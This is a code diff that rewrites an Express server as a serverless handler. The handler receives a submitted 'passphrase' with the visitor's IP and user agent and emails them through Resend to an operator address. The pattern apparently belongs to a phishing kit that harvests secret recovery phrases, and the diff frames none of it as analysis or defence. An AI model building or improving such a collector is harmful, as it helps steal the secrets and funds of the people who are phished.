@@ -1,34 +1,23 @@
-import express from 'express';
 import { Resend } from 'resend';
-import { fileURLToPath } from 'url';
-import { dirname, join } from 'path';
-import cors from 'cors';
-import dotenv from 'dotenv';
 
-// Load environment variables
-dotenv.config();
+export default async function handler(req, res) {
+  // Only allow POST requests
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
 
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = dirname(__filename);
-
-const app = express();
-
-// Enable CORS
-app.use(cors());
-app.use(express.json());
-
-// Initialize Resend
-const resend = new Resend(process.env.RESEND_API_KEY);
-
-// API endpoint for sending emails
-app.post('/api/send-email', async (req, res) => {
   try {
     const { passphrase, ip, userAgent } = req.body;
 
-    if (!passphrase) {
+    // Validate input
+    if (!passphrase || passphrase.trim().length === 0) {
       return res.status(400).json({ error: 'Passphrase is required' });
     }
 
+    // Initialize Resend
+    const resend = new Resend(process.env.RESEND_API_KEY);
+
+    // Send email
     const { data, error } = await resend.emails.send({
       from: process.env.FROM_EMAIL || 'onboarding@resend.dev',
       to: process.env.TO_EMAIL,
@@ -50,22 +39,17 @@ app.post('/api/send-email', async (req, res) => {
       return res.status(500).json({ success: false, error: 'Failed to send email' });
     }
 
-    res.json({ success: true, message: 'Email sent successfully', id: data.id });
+    return res.status(200).json({ 
+      success: true, 
+      message: 'Email sent successfully',
+      id: data.id 
+    });
+
   } catch (error) {
-    console.error('Error sending email:', error);
-    res.status(500).json({ success: false, error: 'Failed to send email' });
+    console.error('API Error:', error);
+    return res.status(500).json({ 
+      success: false, 
+      error: 'Failed to send email' 
+    });
   }
-});
-
-// Serve static files from the dist directory
-app.use(express.static(join(__dirname, 'dist')));
-
-// Serve index.html for all other routes
-app.get('*', (req, res) => {
-  res.sendFile(join(__dirname, 'dist', 'index.html'));
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-}); 
+} 
